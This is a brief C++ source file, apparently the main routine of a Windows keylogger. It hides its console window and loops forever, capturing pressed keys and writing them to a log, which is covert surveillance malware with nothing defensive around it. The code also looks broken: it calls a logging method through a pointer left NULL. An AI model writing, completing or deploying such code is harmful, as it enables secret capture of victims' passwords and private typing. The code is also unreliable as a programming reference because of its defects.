#include "logManager.h"
#include "keyLogger.h"
#include "windowManager.h"

#define ITERATION_DELAY 120

logManager* logManager::manager = NULL;

int main()
{
    char key = 0;

    logManager* manager = NULL;

    windowManager::hideConsoleWindow();

    // Mainloop that logs the keystrokes.
    while(TRUE)
    {
        key = keyLogger::checkPressedKey();
        std::cout << key;
        manager->writeCharToLog(key);
        Sleep(ITERATION_DELAY); 
    }
	return 0;
}